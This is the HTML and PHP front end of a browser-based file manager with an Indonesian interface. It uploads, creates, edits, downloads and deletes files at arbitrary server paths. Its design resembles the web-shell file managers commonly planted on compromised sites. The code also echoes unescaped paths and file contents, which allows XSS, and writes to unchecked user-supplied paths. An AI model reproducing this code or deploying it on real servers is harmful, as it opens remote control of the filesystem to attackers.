<body>

<div class="container">
    <div class="header">
        <h2 style="margin:0; color:#2d3748;">📁 File Manager</h2>
        <a href="?logout=1" class="btn btn-danger">Keluar</a>
    </div>

    <div class="path">Direktori: <?php echo $dir; ?></div>
    <br>

    <div class="layout">
        <div class="toolbar">
            <form method="POST" enctype="multipart/form-data" style="display:inline-flex; gap:5px;">
                <input type="file" name="upload_file" required>
                <input type="submit" name="do_upload" value="Upload File" class="btn btn-success">
            </form>
            
            <form method="POST" style="display:inline-flex; gap:5px;">
                <input type="text" name="item_name" placeholder="Nama Baru..." required>
                <input type="submit" name="do_mkdir" value="+ Folder" class="btn">
                <input type="submit" name="do_mkfile" value="+ File Baru" class="btn" style="background:#3182ce;">
            </form>
            
            <?php
            // Logika aksi form
            if (isset($_POST['do_upload'])) {
                if (@move_uploaded_file($_FILES['upload_file']['tmp_name'], $dir . '/' . basename($_FILES['upload_file']['name']))) {
                    echo "<script>window.location='?dir=".urlencode($dir)."';</script>";
                }
            }
            if (isset($_POST['do_mkdir'])) {
                @mkdir($dir . '/' . $_POST['item_name'], 0755);
                header("Location: ?dir=" . urlencode($dir));
            }
            if (isset($_POST['do_mkfile'])) {
                @file_put_contents($dir . '/' . $_POST['item_name'], '');
                header("Location: ?dir=" . urlencode($dir) . "&edit=" . urlencode($dir . '/' . $_POST['item_name']));
            }
            if (isset($_POST['save_file'])) {
                @file_put_contents($_POST['target_file'], $_POST['file_content']);
                echo "<script>alert('File berhasil disimpan!'); window.location='?dir=".urlencode($dir)."';</script>";
            }
            ?>
        </div>

        <?php if (isset($_GET['edit'])): ?>
            <div class="editor-box">
                <h3 style="margin-top:0;">📝 Mengedit File: <?php echo htmlspecialchars(basename($edit_filename)); ?></h3>
                <form method="POST">
                    <input type="hidden" name="target_file" value="<?php echo htmlspecialchars($edit_filename); ?>">
                    <textarea class="editor-textarea" name="file_content"><?php echo $edit_content; ?></textarea>
                    <div style="display:flex; gap:10px;">
                        <input type="submit" name="save_file" value="Simpan Perubahan" class="btn btn-success">
                        <a href="?dir=<?php echo urlencode($dir); ?>" class="btn" style="background:#718096;">Batal</a>
                    </div>
                </form>
            </div>
            <br>
        <?php endif; ?>

        <table>
            <thead>
                <tr>
                    <th>Nama</th>
                    <th>Ukuran</th>
                    <th style="text-align:right;">Aksi</th>
                </tr>
            </thead>
            <tbody>
                <?php 
                // Mengambil path satu tingkat di atas direktori saat ini
                $posisi_slash = strrpos($dir, '/');
                if ($posisi_slash !== false && $dir != $root):
                    $parent = substr($dir, 0, $posisi_slash);
                    if(empty($parent)) $parent = "/";
                ?>
                <tr>
                    <td colspan="3">
                        <a href="?dir=<?php echo urlencode($parent); ?>" style="text-decoration:none; color:#3182ce; font-weight:bold; font-size:15px;">↩️ .. (Kembali ke Folder Sebelumnya)</a>
                    </td>
                </tr>
                <?php endif; ?>

                <?php
                if (!empty($items)) {
                    // Kelompokkan folder di atas, file di bawah agar rapi
                    $folders_list = [];
                    $files_list = [];

                    foreach ($items as $item) {
                        if ($item == '.' || $item == '..') continue;
                        if ($item == '.htaccess') continue; // Sembunyikan htaccess untuk menghindari crash internal server

                        $full_path = $dir . '/' . $item;
                        if (@is_dir($full_path)) {
                            $folders_list[] = $item;
                        } else {
                            $files_list[] = $item;
                        }
                    }

                    // Render Folder Dahulu
                    foreach ($folders_list as $f) {
                        $full_path = $dir . '/' . $f;
                        echo "<tr>";
                        echo "<td><a href='?dir=" . urlencode($full_path) . "' style='text-decoration:none; color:#dd6b20; font-weight:bold;'>📁 $f</a></td>";
                        echo "<td>Folder</td>";
                        echo "<td style='text-align:right;'><a href='?dir=" . urlencode($dir) . "&delete=" . urlencode($full_path) . "' class='btn btn-danger' style='padding:3px 8px; font-size:12px;' onclick='return confirm(\"Hapus folder ini?\")'>Hapus</a></td>";
                        echo "</tr>";
                    }

                    // Render File Berikutnya
                    foreach ($files_list as $f) {
                        $full_path = $dir . '/' . $f;
                        $size = round(@filesize($full_path) / 1024, 2) . ' KB';
                        echo "<tr>";
                        echo "<td>📄 $f</td>";
                        echo "<td>$size</td>";
                        echo "<td style='text-align:right;'>";
                        echo "<a href='?dir=" . urlencode($dir) . "&edit=" . urlencode($full_path) . "' class='btn' style='padding:3px 8px; font-size:12px; background:#4a5568; margin-right:4px;'>Edit</a>";
                        echo "<a href='?dir=" . urlencode($dir) . "&download=" . urlencode($full_path) . "' class='btn' style='padding:3px 8px; font-size:12px; background:#2ecc71; margin-right:4px;'>Unduh</a>";
                        echo "<a href='?dir=" . urlencode($dir) . "&delete=" . urlencode($full_path) . "' class='btn btn-danger' style='padding:3px 8px; font-size:12px;' onclick='return confirm(\"Hapus file ini?\")'>Hapus</a>";
                        echo "</td>";
                        echo "</tr>";
                    }
                } else {
                    echo "<tr><td colspan='3' style='text-align:center; color:#a0aec0; padding:30px 10px;'>Folder Ini Kosong / Akses Direktori Terkunci Server (403)</td></tr>";
                }
                ?>
            </tbody>
        </table>
    </div>
</div>

</body>
</html>
